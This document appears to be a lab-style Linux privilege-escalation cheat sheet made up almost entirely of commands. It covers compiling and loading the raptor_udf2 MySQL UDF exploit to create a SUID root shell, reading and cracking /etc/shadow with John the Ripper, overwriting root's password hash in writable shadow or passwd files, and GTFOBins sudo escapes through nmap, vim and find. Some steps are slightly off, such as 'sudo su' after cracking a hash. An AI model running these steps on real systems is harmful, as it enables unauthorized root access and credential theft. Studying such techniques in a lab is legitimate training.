

# 💻 <span style="color:#1E90FF">**SQL Exploit**</span>


###  **Change into the MySQL Directory:**

```bash
cd /home/user/tools/mysql-udf
```

---

###  **Compile the `raptor_udf2.c` Exploit Code:**

```bash
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

---

###  **Connect to the MySQL Service as the Root User (No Password):**

```bash
mysql -u root
```

---

###  **Create a User Defined Function (UDF) "do_system" Using the Compiled Exploit:**

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

---

###  **Copy `/bin/bash` to `/tmp/rootbash` and Set the SUID Permission:**

```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

---

###  **Exit from the MySQL Shell:**

```bash
exit
```

---

###  **Run `/tmp/rootbash` with Root Privileges:**

```bash
/tmp/rootbash -p
```

---

###  **Clean Up and Exit from Root:**

```bash
rm /tmp/rootbash
exit
```



# 🛡️ <span style="color:#32CD32">**Weak File Permissions (Readable shadow file)**</span>


## **Check the Permissions of the `shadow` File**

```bash
ls -l /etc/shadow
```

---

## **Show the Hash of the Root Password**

```bash
cat /etc/shadow
```

---

## **Crack the Hash with John the Ripper (Dictionary Attack)**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## **Privilege Escalation**

```bash
sudo su
```



# 🔓 **Weak File Permissions (Writable Shadow File) Exploit**



##   **Check the Permissions of the Shadow File**

Ensure the shadow file is writable:

```bash
ls -l /etc/shadow
```

---

##   **Generate a New Password Hash**

To create a password hash with your chosen password, use the following command:

```bash
mkpasswd -m (hashing algorithm) newpass
```

For example, to use **SHA-512**, the command would be:

```bash
mkpasswd -m sha-512 newpass
```

---

##  **Edit the Shadow File and Replace the Root Password Hash**

1. Open the **shadow** file with elevated privileges using a text editor like `nano` or `vi`:

```bash
nano /etc/shadow
```

2. Find the **root** entry in the shadow file.  
3. Replace the old hash with your newly generated password hash.

---

##   **Gain Root Privileges**

After replacing the password hash, escalate your privileges with:

```bash
sudo su
```

# 🌐 Weak File Permissions (Writable passwd File)



## **Check the Permissions of the `/etc/passwd` File**

First, verify that the `/etc/passwd` file is world-writable:

```bash
ls -l /etc/passwd
```

Look for a **w** in the third section of the file permissions (e.g., `-rw-rw-rw-`).

---

## **Generate a New Password Hash**

Generate a new password hash for a password of your choice using the **openssl** command:

```bash
openssl passwd newpasswordhere
```

This will output a hashed password that you can use in the next step.

---

## **Edit the `/etc/passwd` File**

Open the `/etc/passwd` file using a text editor like `nano`:

```bash
nano /etc/passwd
```

---

## **Replace or Add a Password Hash for Root**

- **Replace the Root User's Password Hash**:  
  Find the **root** user's row (the first row in the file) and replace the **x** between the first and second colon (`:`) with the newly generated password hash.

  **Before:**

  ```
  root:x:0:0:root:/root:/bin/bash
  ```

  **After:**

  ```
  root:$6$abcde$hashgoeshere:0:0:root:/root:/bin/bash
  ```

---

## **Switch to the Root**

 use the new password to switch to the root user:

```bash
su root
```


# 🔍 <span style="color:#1E90FF">**Exploiting Programs from `sudo -l` using GTFOBins**</span>



### <span style="color:#FF6347">**Step 1: Run `sudo -l` to List Allowed Commands**</span>

Open your terminal and run the following command to list the allowed `sudo` commands for your user:

```bash
sudo -l
```

This command displays all programs you are allowed to run with `sudo`. Example output:

```bash
User user may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/nmap
    (ALL) NOPASSWD: /bin/bash
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /usr/bin/find
```

---

###  <span style="color:#32CD32">**Step 2: Identify Exploitable Programs on GTFOBins**</span>

Head over to [GTFOBins](https://gtfobins.github.io/) and search for each program that appeared in your `sudo -l` output. This website lists binaries that can be exploited to escalate privileges.

**Search for each program** listed in your `sudo -l` output such as `nmap`, `bash`, `vim`, etc., on GTFOBins.

---

### ️ <span style="color:#FFD700">**Step 3: Follow GTFOBins Instructions**</span>

For every exploitable program you find on GTFOBins, follow the instructions provided on the website to perform privilege escalation.

---

### **Examples of Exploitable Programs**:

---

####  <span style="color:#FF6347">**1. `nmap` Exploit:**</span>

If `nmap` is listed in `sudo -l`:

1. Visit the [nmap page on GTFOBins](https://gtfobins.github.io/gtfobins/nmap/).
2. Follow these Sudo instructions:
   ```bash
   sudo nmap --interactive
   ```
3. Once inside the interactive prompt, type:
   ```bash
   !sh
   ```
   This will spawn a **root shell**.

---

####  <span style="color:#32CD32">**2. `bash` Exploit:**</span>

If `bash` is listed in `sudo -l`, follow these steps:

1. Visit the [bash page on GTFOBins](https://gtfobins.github.io/gtfobins/bash/).
2. Run the command:
   ```bash
   sudo bash
   ```
   This will directly give you a **root shell**.

---

####  <span style="color:#FFD700">**3. `vim` Exploit:**</span>

If `vim` appears in your `sudo -l` output, follow these steps:

1. Visit the [vim page on GTFOBins](https://gtfobins.github.io/gtfobins/vim/).
2. Use the following command:
   ```bash
   sudo vim -c ':!sh'
   ```
   This will drop you into a **root shell** within the `vim` editor.

---

####  <span style="color:#1E90FF">**4. `find` Exploit:**</span>

If `find` is listed:

1. Visit the [find page on GTFOBins](https://gtfobins.github.io/gtfobins/find/).
2. Run the following:
   ```bash
   sudo find . -exec /bin/sh \; -quit
   ```
   This will spawn a **root shell** using the `find` command.

---

###  <span style="color:#FF4500">**Step 4: Verify Your Privilege Escalation**</span>

After executing the GTFOBins instructions, verify that you’ve escalated privileges successfully by running:

```bash
whoami
```

If the output is `root`, you’ve **successfully gained root access**!

---

###  <span style="color:#FF6347">**Step 5: Repeat for Each Program**</span>

Search each program listed by `sudo -l` on GTFOBins and follow the steps provided to see if you can exploit them for privilege escalation.

By following this process, you can methodically **exploit allowed binaries** and **gain root access** on your system!
